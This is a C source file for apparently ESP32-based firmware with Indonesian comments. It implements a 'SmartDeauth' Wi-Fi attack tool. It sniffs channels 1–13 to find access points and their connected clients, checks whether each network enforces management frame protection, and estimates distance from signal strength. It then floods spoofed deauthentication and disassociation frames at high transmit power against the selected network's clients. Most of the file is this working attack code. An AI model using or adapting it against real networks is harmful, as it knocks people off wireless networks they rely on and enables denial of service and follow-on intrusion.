#include "wlan_smart_deauth.h"
#include <wlan_hal.h>
#include <esp_log.h>
#include <esp_wifi.h>
#include <esp_heap_caps.h>
#include <string.h>
#include <stdlib.h>
#include <math.h>
#include <freertos/FreeRTOS.h>
#include <freertos/task.h>
#include <core/common_defines.h>
#include <freertos/semphr.h>

#define TAG "SmartDeauth"

// Stack task (byte). Dialokasi SEKALI (PSRAM dulu, internal fallback — pola sama
// dengan furi_thread_alloc_stack; seluruh app termasuk operasi WiFi memang jalan
// di stack PSRAM) lalu dipakai ulang antar buka/tutup scene. Dulu xTaskCreate-
// PinnedToCore dinamis dari internal RAM: KADANG gagal diam-diam saat internal
// terfragmentasi (setelah cycle WiFi largest block bisa <8KB) → loading
// menggantung selamanya tanpa satu baris log pun.
#define SD_TASK_STACK 10240

// ============================================================================
// STATE
// ============================================================================
static TaskHandle_t        s_task = NULL;
static StackType_t*        s_task_stack = NULL;   // internal RAM, dialokasi sekali & di-reuse
static StaticTask_t        s_task_buf;
static volatile bool       s_running = false;
static volatile bool       s_cancel = false;
static volatile bool       s_task_done = true;
static volatile SdViewMode s_mode = SdViewModeScan;
static volatile bool       s_scan_request = false;
static volatile int8_t     s_pending_select = -1;
static volatile bool       s_attack_exited = true;
static SemaphoreHandle_t   s_state_mtx = NULL;

static SdChannelInfo       s_channels_live[13];
static SdChannelInfo       s_channels_snap[13];
static volatile bool       s_scanning = false;
static SdRssiFilter        s_rssi_filters[14];

static volatile bool       s_attack_running = false;
static volatile bool       s_attack_clients_ready = false;
static volatile uint8_t    s_attack_channel = 0;
static uint8_t             s_attack_bssid[6] = {0};
static char                s_attack_ssid[33] = {0};
static volatile uint32_t   s_attack_frames = 0;
static volatile uint32_t   s_attack_fps = 0;
static volatile uint32_t   s_attack_beacon_age_ms = 0;
static volatile uint32_t   s_attack_last_beacon = 0;
static SdClientEntry       s_attack_clients[SD_MAX_CH_CLIENTS];
static volatile uint8_t    s_attack_client_count = 0;

static volatile bool       s_monitor_running = false;
static volatile uint8_t    s_monitor_channel = 0;
static uint8_t             s_monitor_bssid[6] = {0};
static char                s_monitor_ssid[33] = {0};
static volatile int8_t     s_monitor_rssi = -100;
static volatile uint32_t   s_monitor_beacon_count = 0;
static volatile uint32_t   s_monitor_data_count = 0;
static volatile uint32_t   s_monitor_data_bytes = 0;   // akumulator byte data frame (untuk throughput)
static volatile uint32_t   s_monitor_rate_bps = 0;      // throughput tersampel (byte/detik)
static SdClientEntry       s_monitor_clients[SD_MAX_CLIENTS];
static volatile uint8_t    s_monitor_client_count = 0;
static SdRssiFilter        s_monitor_rssi_filter;

static uint8_t             s_tx_buf[256];
static uint16_t            s_seq = 0;

static const uint8_t s_deauth_tmpl[26] = {
    0xC0, 0x00, 0x3A, 0x01,
    0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x02, 0x00,
};
static const uint8_t s_reasons[4] = {0x01, 0x04, 0x02, 0x03};

// ============================================================================
// HELPERS
// ============================================================================
static inline uint32_t now_ms(void) {
    return (uint32_t)(xTaskGetTickCount() * portTICK_PERIOD_MS);
}
static inline void sd_lock(void)   { if(s_state_mtx) xSemaphoreTake(s_state_mtx, portMAX_DELAY); }
static inline void sd_unlock(void) { if(s_state_mtx) xSemaphoreGive(s_state_mtx); }
static inline void sd_write_seq(uint8_t* buf, uint16_t seq) {
    uint16_t s = seq & 0x0FFF;
    buf[22] = (uint8_t)((s & 0x000F) << 4);
    buf[23] = (uint8_t)((s >> 4) & 0xFF);
}

// ============================================================================
// RSSI
// ============================================================================
static int8_t sd_rssi_median(SdRssiFilter* f) {
    if(f->count == 0) return -100;
    int8_t tmp[SD_RSSI_MEDIAN_WINDOW];
    uint8_t n = f->count;
    memcpy(tmp, f->history, n);
    for(uint8_t i = 1; i < n; i++) {
        int8_t k = tmp[i];
        int8_t j = i - 1;
        while(j >= 0 && tmp[j] > k) { tmp[j+1] = tmp[j]; j--; }
        tmp[j+1] = k;
    }
    return tmp[n/2];
}
static int8_t sd_rssi_update(SdRssiFilter* f, int8_t raw) {
    if(raw > -20 || raw < -100) return f->filtered ? f->filtered : -100;
    f->raw = raw;
    f->history[f->idx] = raw;
    f->idx = (f->idx + 1) % SD_RSSI_MEDIAN_WINDOW;
    if(f->count < SD_RSSI_MEDIAN_WINDOW) f->count++;
    int8_t med = sd_rssi_median(f);
    if(f->filtered == 0) f->filtered = med;
    else f->filtered = (int8_t)(0.4f * med + 0.6f * f->filtered);
    return f->filtered;
}
static float sd_rssi_to_distance(int8_t rssi) {
    if(rssi > -20 || rssi < -100) return -1.0f;
    float d = powf(10.0f, (SD_RSSI_REF_1M - (float)rssi) / (10.0f * SD_PATH_LOSS_N));
    if(d > 200.0f) d = 200.0f;
    return d;
}

// ============================================================================
// PMF PARSER
// ============================================================================
static SdPmfState sd_parse_pmf(const uint8_t* ies, int len) {
    bool rsn_r = false, rsn_c = false, ext_r = false, ext_c = false;
    int pos = 0;
    while(pos + 2 <= len) {
        uint8_t id = ies[pos];
        uint8_t ilen = ies[pos + 1];
        if(pos + 2 + ilen > len) break;
        const uint8_t* p = &ies[pos + 2];
        if(id == 48 && ilen >= 18) {
            int rp = 6;
            if(rp + 2 <= ilen) {
                uint16_t pc = p[rp] | (p[rp+1] << 8);
                rp += 2 + pc * 4;
                if(rp + 2 <= ilen) {
                    uint16_t ac = p[rp] | (p[rp+1] << 8);
                    rp += 2 + ac * 4;
                    if(rp + 2 <= ilen) {
                        uint16_t caps = p[rp] | (p[rp+1] << 8);
                        if(caps & 0x0040) rsn_r = true;
                        if(caps & 0x0080) rsn_c = true;
                    }
                }
            }
        }
        if(id == 127 && ilen >= 3) {
            if(p[2] & 0x40) ext_r = true;
            if(p[2] & 0x80) ext_c = true;
        }
        pos += 2 + ilen;
    }
    if(rsn_r || ext_r) return SD_PMF_REQUIRED;
    if(rsn_c || ext_c) return SD_PMF_CAPABLE;
    return SD_PMF_NONE;
}

// ============================================================================
// Data frame helpers
// ============================================================================
static inline const uint8_t* df_bssid(const uint8_t* p, bool to_ds, bool from_ds) {
    if(to_ds && !from_ds) return &p[4];
    if(!to_ds && from_ds) return &p[10];
    return NULL;
}
static inline const uint8_t* df_sta(const uint8_t* p, bool to_ds, bool from_ds) {
    if(to_ds && !from_ds) return &p[10];
    if(!to_ds && from_ds) return &p[4];
    return NULL;
}

// ============================================================================
// SNIFFER SCAN
// ============================================================================
static void sd_sniffer_scan_cb(void* buf, wifi_promiscuous_pkt_type_t type) {
    if(!s_scanning) return;

    const wifi_promiscuous_pkt_t* pkt = buf;
    int sig_len = pkt->rx_ctrl.sig_len;
    if(sig_len < 28) return;
    int len = sig_len - 4;

    uint8_t ch = pkt->rx_ctrl.channel;
    if(ch < 1 || ch > 13) return;

    const uint8_t* p = pkt->payload;
    uint16_t fc = p[0] | (p[1] << 8);
    uint8_t ftype = (fc >> 2) & 0x03;
    uint8_t fsub = (fc >> 4) & 0x0F;

    SdChannelInfo* ci = &s_channels_live[ch - 1];

    if(ftype == 0 && (fsub == 0x08 || fsub == 0x05) && len >= 36) {
        const uint8_t* bssid = &p[16];
        if(bssid[0] & 0x01) return;
        const uint8_t* ies = &p[36];
        int ies_len = len - 36;
        char ssid[33] = {0};
        int ip = 0;
        while(ip + 2 <= ies_len) {
            uint8_t id = ies[ip];
            uint8_t il = ies[ip + 1];
            if(ip + 2 + il > ies_len) break;
            if(id == 0) {
                int sl = il > 32 ? 32 : il;
                memcpy(ssid, &ies[ip + 2], sl);
                ssid[sl] = 0;
                break;
            }
            ip += 2 + il;
        }
        SdPmfState pmf = sd_parse_pmf(ies, ies_len);

        if(!ci->has_ap) {
            ci->channel = ch;
            ci->has_ap = true;
            memcpy(ci->bssid, bssid, 6);
            strncpy(ci->ssid, ssid, 32);
            ci->ssid[32] = 0;
            ci->pmf = pmf;
            ci->ap_count = 1;
        } else {
            ci->ap_count++;
            if(pkt->rx_ctrl.rssi > ci->rssi_raw) {
                memcpy(ci->bssid, bssid, 6);
                strncpy(ci->ssid, ssid, 32);
                ci->ssid[32] = 0;
                ci->pmf = pmf;
            }
        }
        ci->rssi = sd_rssi_update(&s_rssi_filters[ch], pkt->rx_ctrl.rssi);
        ci->rssi_raw = pkt->rx_ctrl.rssi;
        ci->beacon_count++;
        return;
    }

    if(ftype == 2 && len >= 24) {
        uint8_t to_ds = (fc & 0x0100) >> 8;
        uint8_t from_ds = (fc & 0x0200) >> 9;
        const uint8_t* bssid = df_bssid(p, to_ds, from_ds);
        const uint8_t* sta = df_sta(p, to_ds, from_ds);
        if(!bssid || !sta) return;
        if(sta[0] & 0x01) return;
        if(!ci->has_ap) return;
        if(memcmp(bssid, ci->bssid, 6) != 0) return;

        uint8_t n = ci->client_slot_count;
        if(n > SD_MAX_CH_CLIENTS) n = SD_MAX_CH_CLIENTS;
        for(uint8_t i = 0; i < n; i++) {
            if(memcmp(ci->clients[i].mac, sta, 6) == 0) {
                ci->clients[i].packets++;
                ci->clients[i].rssi = pkt->rx_ctrl.rssi;
                return;
            }
        }
        if(ci->client_slot_count < SD_MAX_CH_CLIENTS) {
            SdClientEntry* e = &ci->clients[ci->client_slot_count++];
            memcpy(e->mac, sta, 6);
            e->packets = 1;
            e->rssi = pkt->rx_ctrl.rssi;
            e->valid = true;
            ci->client_count++;
        }
    }
}

// ============================================================================
// SNIFFER ATTACK — FIX F1: cek sig_len
// ============================================================================
static void sd_sniffer_attack_cb(void* buf, wifi_promiscuous_pkt_type_t type) {
    if(!s_attack_running) return;

    const wifi_promiscuous_pkt_t* pkt = buf;
    int sig_len = pkt->rx_ctrl.sig_len;
    if(sig_len < 24) return;   // FIX F1

    const uint8_t* p = pkt->payload;
    uint16_t fc = p[0] | (p[1] << 8);
    uint8_t ftype = (fc >> 2) & 0x03;
    uint8_t fsub = (fc >> 4) & 0x0F;
    if(ftype != 0 || fsub != 0x08) return;

    const uint8_t* bssid = &p[16];
    if(memcmp(bssid, s_attack_bssid, 6) != 0) return;
    s_attack_last_beacon = now_ms();
}

// ============================================================================
// SNIFFER MONITOR — FIX F4: cek sig_len eksplisit
// ============================================================================
static void sd_sniffer_monitor_cb(void* buf, wifi_promiscuous_pkt_type_t type) {
    if(!s_monitor_running) return;

    const wifi_promiscuous_pkt_t* pkt = buf;
    int sig_len = pkt->rx_ctrl.sig_len;
    if(sig_len < 24) return;   // FIX F4

    int len = sig_len - 4;
    const uint8_t* p = pkt->payload;
    uint16_t fc = p[0] | (p[1] << 8);
    uint8_t ftype = (fc >> 2) & 0x03;
    uint8_t fsub = (fc >> 4) & 0x0F;

    if(ftype == 0 && fsub == 0x08 && len >= 22) {
        const uint8_t* bssid = &p[16];
        if(memcmp(bssid, s_monitor_bssid, 6) != 0) return;
        s_monitor_beacon_count++;
        s_monitor_rssi = sd_rssi_update(&s_monitor_rssi_filter, pkt->rx_ctrl.rssi);
        return;
    }

    if(ftype == 2 && len >= 24) {
        uint8_t to_ds = (fc & 0x0100) >> 8;
        uint8_t from_ds = (fc & 0x0200) >> 9;
        const uint8_t* bssid = df_bssid(p, to_ds, from_ds);
        const uint8_t* sta = df_sta(p, to_ds, from_ds);
        if(!bssid || !sta) return;
        if(sta[0] & 0x01) return;
        if(memcmp(bssid, s_monitor_bssid, 6) != 0) return;

        s_monitor_data_count++;
        if(len > 0) s_monitor_data_bytes += (uint32_t)len;   // untuk hitung throughput presisi

        uint8_t n = s_monitor_client_count;
        if(n > SD_MAX_CLIENTS) n = SD_MAX_CLIENTS;
        for(uint8_t i = 0; i < n; i++) {
            if(memcmp(s_monitor_clients[i].mac, sta, 6) == 0) {
                s_monitor_clients[i].packets++;
                s_monitor_clients[i].rssi = pkt->rx_ctrl.rssi;
                return;
            }
        }
        if(s_monitor_client_count < SD_MAX_CLIENTS) {
            SdClientEntry* c = &s_monitor_clients[s_monitor_client_count];
            memcpy(c->mac, sta, 6);
            c->packets = 1;
            c->rssi = pkt->rx_ctrl.rssi;
            c->valid = true;
            s_monitor_client_count++;
        }
    }
}

// ============================================================================
// SCAN
// ============================================================================
static void sd_do_scan(void) {
    ESP_LOGI(TAG, "[SCAN] Start");
    s_scan_request = false;

    memset(s_channels_live, 0, sizeof(s_channels_live));
    memset(s_rssi_filters, 0, sizeof(s_rssi_filters));

    s_scanning = true;
    wlan_hal_set_promiscuous_filter(
        WIFI_PROMIS_FILTER_MASK_MGMT | WIFI_PROMIS_FILTER_MASK_DATA);
    wlan_hal_set_promiscuous(true, sd_sniffer_scan_cb);
    vTaskDelay(pdMS_TO_TICKS(30));

    uint32_t t0 = now_ms();
    for(uint8_t ch = 1; ch <= 13 && !s_cancel; ch++) {
        wlan_hal_set_channel(ch);
        vTaskDelay(pdMS_TO_TICKS(SD_SCAN_SETTLE_MS + SD_SCAN_DWELL_MS));
    }
    s_scanning = false;
    wlan_hal_set_promiscuous(false, NULL);
    vTaskDelay(pdMS_TO_TICKS(50));

    sd_lock();
    memcpy(s_channels_snap, s_channels_live, sizeof(s_channels_live));
    sd_unlock();

    ESP_LOGI(TAG, "[SCAN] Done in %lums", (unsigned long)(now_ms() - t0));
    for(int i = 0; i < 13; i++) {
        SdChannelInfo* ci = &s_channels_snap[i];
        if(ci->has_ap) {
            float d = sd_rssi_to_distance(ci->rssi);
            ESP_LOGI(TAG, "  Ch%d %dAP/%dCli RSSI=%d (~%.1fm) %s",
                     ci->channel, ci->ap_count, ci->client_count,
                     ci->rssi, d, ci->ssid);
        }
    }

    int8_t pending = s_pending_select;
    s_pending_select = -1;
    if(pending >= 0 && pending < 13) {
        wlan_smart_deauth_select_channel((uint8_t)pending);
    }
}

// ============================================================================
// DISCOVERY
// ============================================================================
static void sd_discovery_phase(uint32_t duration_ms) {
    ESP_LOGI(TAG, "[DISC] %lums ch%u", (unsigned long)duration_ms, s_attack_channel);

    s_attack_client_count = 0;
    s_attack_clients_ready = false;
    memset(s_attack_clients, 0, sizeof(s_attack_clients));

    s_monitor_channel = s_attack_channel;
    memcpy(s_monitor_bssid, s_attack_bssid, 6);
    s_monitor_client_count = 0;
    memset(s_monitor_clients, 0, sizeof(s_monitor_clients));
    s_monitor_data_count = 0;
    s_monitor_beacon_count = 0;
    s_monitor_running = true;

    wlan_hal_set_promiscuous_filter(
        WIFI_PROMIS_FILTER_MASK_MGMT | WIFI_PROMIS_FILTER_MASK_DATA);
    wlan_hal_set_promiscuous(true, sd_sniffer_monitor_cb);

    uint32_t t0 = now_ms();
    while(!s_cancel && s_attack_running && (now_ms() - t0) < duration_ms) {
        vTaskDelay(pdMS_TO_TICKS(50));
    }

    s_monitor_running = false;
    wlan_hal_set_promiscuous(false, NULL);
    vTaskDelay(pdMS_TO_TICKS(30));

    uint8_t n = s_monitor_client_count;
    if(n > SD_MAX_CH_CLIENTS) n = SD_MAX_CH_CLIENTS;
    memcpy(s_attack_clients, s_monitor_clients, sizeof(SdClientEntry) * n);
    s_attack_client_count = n;
    s_attack_clients_ready = true;

    ESP_LOGI(TAG, "[DISC] Found %u clients", n);
}

// ============================================================================
// ATTACK LOOP
// ============================================================================
static void sd_attack_loop(void) {
    ESP_LOGI(TAG, "[ATTACK] Ch%u '%s'", s_attack_channel, s_attack_ssid);

    wlan_hal_set_channel(s_attack_channel);
    vTaskDelay(pdMS_TO_TICKS(30));
    wlan_hal_channel_lock();
    wlan_hal_set_max_tx_power(80);

    if(!s_attack_clients_ready) {
        sd_discovery_phase(SD_DISCOVERY_MS);
    } else {
        ESP_LOGI(TAG, "[ATTACK] Skip disc (%u cached)", s_attack_client_count);
    }

    wlan_hal_set_promiscuous_filter(WIFI_PROMIS_FILTER_MASK_MGMT);
    wlan_hal_set_promiscuous(true, sd_sniffer_attack_cb);

    s_attack_last_beacon = now_ms();
    s_attack_frames = 0;
    s_attack_fps = 0;

    uint32_t last_fps_calc = now_ms();
    uint32_t fps_counter = 0;
    uint8_t  reason_idx = 0;
    uint32_t last_reason_change = now_ms();
    uint32_t iter = 0;
    uint32_t yield_ctr = 0;

    while(!s_cancel && s_attack_running) {
        if(now_ms() - last_reason_change > 500) {
            reason_idx = (reason_idx + 1) % 4;
            last_reason_change = now_ms();
        }
        uint8_t reason = s_reasons[reason_idx];

        uint8_t cli_count = s_attack_client_count;
        if(cli_count > SD_MAX_CH_CLIENTS) cli_count = SD_MAX_CH_CLIENTS;

        for(uint8_t i = 0; i < cli_count && !s_cancel && s_attack_running; i++) {
            const uint8_t* cmac = s_attack_clients[i].mac;

            memcpy(s_tx_buf, s_deauth_tmpl, 26);
            s_tx_buf[0] = 0xC0;
            memcpy(&s_tx_buf[4], cmac, 6);
            memcpy(&s_tx_buf[10], s_attack_bssid, 6);
            memcpy(&s_tx_buf[16], s_attack_bssid, 6);
            s_tx_buf[24] = reason;
            sd_write_seq(s_tx_buf, s_seq++);
            if(wlan_hal_raw_tx_direct(s_tx_buf, 26)) { s_attack_frames++; fps_counter++; }

            s_tx_buf[0] = 0xA0;
            sd_write_seq(s_tx_buf, s_seq++);
            if(wlan_hal_raw_tx_direct(s_tx_buf, 26)) { s_attack_frames++; fps_counter++; }

            memcpy(s_tx_buf, s_deauth_tmpl, 26);
            s_tx_buf[0] = 0xC0;
            memcpy(&s_tx_buf[4], s_attack_bssid, 6);
            memcpy(&s_tx_buf[10], cmac, 6);
            memcpy(&s_tx_buf[16], s_attack_bssid, 6);
            s_tx_buf[24] = reason;
            sd_write_seq(s_tx_buf, s_seq++);
            if(wlan_hal_raw_tx_direct(s_tx_buf, 26)) { s_attack_frames++; fps_counter++; }

            s_tx_buf[0] = 0xA0;
            sd_write_seq(s_tx_buf, s_seq++);
            if(wlan_hal_raw_tx_direct(s_tx_buf, 26)) { s_attack_frames++; fps_counter++; }
        }

        uint32_t bc_mod = (cli_count == 0) ? 5 : 10;
        if((++iter % bc_mod) == 0) {
            memcpy(s_tx_buf, s_deauth_tmpl, 26);
            s_tx_buf[0] = 0xC0;
            memset(&s_tx_buf[4], 0xFF, 6);
            memcpy(&s_tx_buf[10], s_attack_bssid, 6);
            memcpy(&s_tx_buf[16], s_attack_bssid, 6);
            s_tx_buf[24] = reason;
            sd_write_seq(s_tx_buf, s_seq++);
            if(wlan_hal_raw_tx_direct(s_tx_buf, 26)) { s_attack_frames++; fps_counter++; }
        }

        uint32_t now = now_ms();
        if(now - last_fps_calc >= 1000) {
            s_attack_fps = fps_counter;
            fps_counter = 0;
            last_fps_calc = now;
        }
        s_attack_beacon_age_ms = now_ms() - s_attack_last_beacon;

        if((++yield_ctr & 0x1F) == 0) vTaskDelay(1);
        else taskYIELD();
    }

    // Cleanup — selalu lepas lock & matikan promiscuous (semua HAL di thread task).
    // Transisi berikutnya (monitor/attack ulang) akan setup HAL dari awal.
    wlan_hal_set_promiscuous(false, NULL);
    wlan_hal_channel_unlock();
    s_attack_running = false;
    s_attack_exited = true;   // FIX F3
    ESP_LOGI(TAG, "[ATTACK] Stopped, %lu frames", (unsigned long)s_attack_frames);
}

// ============================================================================
// MONITOR LOOP — dijalankan di thread task (bukan thread UI) agar UI tak freeze
// ============================================================================
static void sd_monitor_run(void) {
    // Setup bersih — reset semua counter & filter sebelum sniffer aktif
    s_monitor_channel = s_attack_channel;
    memcpy(s_monitor_bssid, s_attack_bssid, 6);
    strncpy(s_monitor_ssid, s_attack_ssid, 32);
    s_monitor_ssid[32] = 0;
    s_monitor_beacon_count = 0;
    s_monitor_data_count = 0;
    s_monitor_data_bytes = 0;
    s_monitor_rate_bps = 0;
    s_monitor_rssi = -100;
    memset(&s_monitor_rssi_filter, 0, sizeof(s_monitor_rssi_filter));

    sd_lock();
    s_monitor_client_count = 0;
    memset(s_monitor_clients, 0, sizeof(s_monitor_clients));
    sd_unlock();

    wlan_hal_set_channel(s_monitor_channel);
    vTaskDelay(pdMS_TO_TICKS(30));
    wlan_hal_channel_lock();

    s_monitor_running = true;
    wlan_hal_set_promiscuous_filter(
        WIFI_PROMIS_FILTER_MASK_MGMT | WIFI_PROMIS_FILTER_MASK_DATA);
    wlan_hal_set_promiscuous(true, sd_sniffer_monitor_cb);
    ESP_LOGI(TAG, "[MONITOR] Ch%u", s_monitor_channel);

    // Loop sampai mode berubah (diminta thread UI) / cancel. Sampel throughput
    // tiap ~1 detik dengan dt aktual agar nilai byte/detik presisi.
    uint32_t rate_t0 = now_ms();
    uint32_t rate_bytes0 = s_monitor_data_bytes;
    while(s_mode == SdViewModeMonitor && s_running && !s_cancel) {
        vTaskDelay(pdMS_TO_TICKS(50));
        uint32_t t = now_ms();
        uint32_t dt = t - rate_t0;
        if(dt >= 1000) {
            uint32_t b = s_monitor_data_bytes;
            s_monitor_rate_bps = (uint32_t)((uint64_t)(b - rate_bytes0) * 1000u / dt);
            rate_bytes0 = b;
            rate_t0 = t;
        }
    }

    // Teardown
    s_monitor_running = false;
    wlan_hal_set_promiscuous(false, NULL);
    wlan_hal_channel_unlock();
    vTaskDelay(pdMS_TO_TICKS(30));
    ESP_LOGI(TAG, "[MONITOR] Exit");
}

// ============================================================================
// MAIN TASK
// ============================================================================
static void sd_task_fn(void* arg) {
    (void)arg;
    ESP_LOGI(TAG, "Task started");

    if(!wlan_hal_is_started()) {
        if(!wlan_hal_start()) { ESP_LOGE(TAG, "start failed"); goto cleanup; }
        vTaskDelay(pdMS_TO_TICKS(500));
    }
    if(wlan_hal_is_connected()) wlan_hal_disconnect();

    sd_do_scan();

    while(s_running && !s_cancel) {
        switch(s_mode) {
        case SdViewModeScan:
            if(s_scan_request) sd_do_scan();
            else vTaskDelay(pdMS_TO_TICKS(100));
            break;

        case SdViewModeAttack:
            // Hanya jalankan loop deauth kalau sudah di-arm lewat OK. Saat ARMED
            // (idle) task menganggur tanpa mengunci radio sampai user menekan OK.
            if(s_attack_running) {
                sd_attack_loop();
            } else {
                vTaskDelay(pdMS_TO_TICKS(100));
            }
            break;

        case SdViewModeMonitor:
            sd_monitor_run();
            break;
        }
    }

cleanup:
    s_scanning = false;   // jangan biarkan loading menggantung bila radio gagal
    s_attack_clients_ready = false;
    wlan_hal_channel_unlock();
    wlan_hal_set_promiscuous(false, NULL);
    ESP_LOGI(TAG, "Task exit");
    s_running = false;
    s_task_done = true;
    s_task = NULL;
    vTaskDelete(NULL);
}

// ============================================================================
// PUBLIC API
// ============================================================================
void wlan_smart_deauth_start(void) {
    if(s_running) return;
    if(!s_state_mtx) s_state_mtx = xSemaphoreCreateMutex();
    if(!s_state_mtx) return;

    s_running = true;
    s_cancel = false;
    s_task_done = false;
    s_mode = SdViewModeScan;
    s_scan_request = false;
    s_pending_select = -1;
    s_attack_running = false;
    s_attack_clients_ready = false;
    s_monitor_running = false;
    s_attack_exited = true;
    s_scanning = true;   // loading langsung tampil sampai scan pertama selesai
    memset(s_channels_live, 0, sizeof(s_channels_live));
    memset(s_channels_snap, 0, sizeof(s_channels_snap));

    // Alokasi stack sekali lalu reuse: PSRAM dulu (tersedia ~4.5MB, tak kena
    // fragmentasi internal), internal fallback. TCB (s_task_buf) tetap di BSS
    // internal sesuai syarat FreeRTOS. Kalau dua-duanya gagal, JANGAN biarkan
    // loading menggantung: reset flag + log → view kembali ke "No networks found".
    if(!s_task_stack) {
        s_task_stack = heap_caps_malloc(
            SD_TASK_STACK * sizeof(StackType_t), MALLOC_CAP_SPIRAM | MALLOC_CAP_8BIT);
        if(!s_task_stack) {
            s_task_stack = heap_caps_malloc(
                SD_TASK_STACK * sizeof(StackType_t), MALLOC_CAP_INTERNAL | MALLOC_CAP_8BIT);
        }
    }
    if(!s_task_stack) {
        ESP_LOGE(TAG, "task stack OOM (spiram free=%u internal free=%u) — scan aborted",
                 (unsigned)heap_caps_get_free_size(MALLOC_CAP_SPIRAM),
                 (unsigned)heap_caps_get_free_size(MALLOC_CAP_INTERNAL));
        s_running = false;
        s_task_done = true;
        s_scanning = false;
        return;
    }

    s_task = xTaskCreateStaticPinnedToCore(
        sd_task_fn, "SmartDeauth", SD_TASK_STACK, NULL, 10, s_task_stack, &s_task_buf, FURI_CORE_ID_SECONDARY);
    if(!s_task) {
        ESP_LOGE(TAG, "task create failed — scan aborted");
        s_running = false;
        s_task_done = true;
        s_scanning = false;
    }
}

void wlan_smart_deauth_stop(void) {
    if(!s_running && s_task_done) return;
    s_cancel = true;
    s_attack_running = false;
    s_monitor_running = false;
    s_attack_exited = true;
    wlan_hal_channel_unlock();
    for(int i = 0; i < 400 && !s_task_done; i++) {
        vTaskDelay(pdMS_TO_TICKS(10));
    }
    // s_task_done di-set tepat sebelum vTaskDelete(NULL). Beri idle task core-1
    // waktu mereklaim TCB statis sebelum s_task_buf dipakai ulang di start().
    vTaskDelay(pdMS_TO_TICKS(20));
    s_task = NULL;
}

bool wlan_smart_deauth_is_running(void) { return s_running; }
SdViewMode wlan_smart_deauth_get_mode(void) { return s_mode; }

void wlan_smart_deauth_scan_now(void) {
    if(s_mode != SdViewModeScan) return;
    s_scan_request = true;
}

bool wlan_smart_deauth_select_channel(uint8_t idx) {
    if(idx >= 13) return false;
    if(s_scanning) {
        s_pending_select = (int8_t)idx;
        ESP_LOGI(TAG, "Select deferred");
        return true;
    }

    SdChannelInfo ci;
    sd_lock();
    ci = s_channels_snap[idx];
    sd_unlock();

    if(!ci.has_ap) {
        ESP_LOGW(TAG, "Ch%u empty", idx + 1);
        return false;
    }

    s_attack_channel = ci.channel;
    memcpy(s_attack_bssid, ci.bssid, 6);
    strncpy(s_attack_ssid, ci.ssid, 32);
    s_attack_ssid[32] = 0;

    uint8_t n = ci.client_slot_count;
    if(n > SD_MAX_CH_CLIENTS) n = SD_MAX_CH_CLIENTS;
    memcpy(s_attack_clients, ci.clients, sizeof(SdClientEntry) * n);
    s_attack_client_count = n;
    s_attack_clients_ready = false;

    ESP_LOGI(TAG, "Selected Ch%u '%s' (%u clients)", ci.channel, ci.ssid, n);

    // FIX F2: set exit flag dari scene thread SEBELUM masuk mode Attack.
    // Masuk mode Attack dalam keadaan ARMED (idle) — deauth TIDAK langsung jalan;
    // baru berjalan saat user menekan OK (wlan_smart_deauth_attack_toggle).
    s_attack_exited = false;
    s_attack_running = false;
    s_mode = SdViewModeAttack;
    return true;
}

void wlan_smart_deauth_attack_toggle(void) {
    if(s_mode != SdViewModeAttack) return;
    if(s_attack_running) s_attack_running = false;
    else s_attack_running = true;
}

// Transisi di bawah ini dipanggil dari thread UI (view_dispatcher): HANYA set
// flag lalu return seketika. Task worker yang melakukan teardown/setup HAL &
// semua vTaskDelay — supaya UI tidak pernah freeze.
void wlan_smart_deauth_monitor_enter(void) {
    if(s_mode != SdViewModeAttack) return;
    s_attack_running = false;       // minta attack loop berhenti
    s_mode = SdViewModeMonitor;     // task akan teardown attack + setup monitor
}

void wlan_smart_deauth_monitor_exit(void) {
    if(s_mode != SdViewModeMonitor) return;
    s_attack_running = false;       // kembali ke Attack dalam keadaan ARMED (OK utk jalan)
    s_mode = SdViewModeAttack;      // task akan keluar monitor_run & re-enter attack
}

void wlan_smart_deauth_back_to_scan(void) {
    s_attack_running = false;
    s_attack_clients_ready = false;
    s_mode = SdViewModeScan;        // task (attack/monitor loop) yang teardown HAL
}

void wlan_smart_deauth_get_view_model(SdViewModel* out) {
    if(!out) return;
    memset(out, 0, sizeof(*out));

    out->mode = s_mode;
    out->running = s_running;

    sd_lock();
    uint8_t dc = 0;
    for(int i = 0; i < 13; i++) {
        const SdChannelInfo* src = &s_channels_snap[i];
        SdChannelView*       dst = &out->channels[i];
        dst->channel      = src->channel;
        dst->ap_count     = src->ap_count;
        dst->client_count = src->client_count;
        dst->rssi         = src->rssi;
        dst->has_ap       = src->has_ap;
        memcpy(dst->ssid, src->ssid, sizeof(dst->ssid));
        if(src->has_ap) out->detected_map[dc++] = (uint8_t)i;  // daftar hanya AP terdeteksi
    }
    out->detected_count = dc;
    uint8_t n = s_monitor_client_count;
    if(n > SD_MAX_CLIENTS) n = SD_MAX_CLIENTS;
    memcpy(out->monitor_clients, s_monitor_clients, sizeof(SdClientEntry) * n);
    out->monitor_client_count = n;
    sd_unlock();

    out->scanning = s_scanning;
    out->attack_channel = s_attack_channel;
    strncpy(out->attack_ssid, s_attack_ssid, 32);
    out->attack_frames = s_attack_frames;
    out->attack_fps = s_attack_fps;
    out->attack_clients = s_attack_client_count;
    out->attack_beacon_age_ms = s_attack_beacon_age_ms;
    out->attack_beacon_alive = (s_attack_beacon_age_ms < 5000);
    out->attack_running = s_attack_running;

    out->monitor_channel = s_monitor_channel;
    strncpy(out->monitor_ssid, s_monitor_ssid, 32);
    memcpy(out->monitor_bssid, s_monitor_bssid, 6);
    out->monitor_rssi = s_monitor_rssi;
    out->monitor_beacon_count = s_monitor_beacon_count;
    out->monitor_data_count = s_monitor_data_count;
    out->monitor_rate_bps = s_monitor_rate_bps;
    out->monitor_running = s_monitor_running;
}
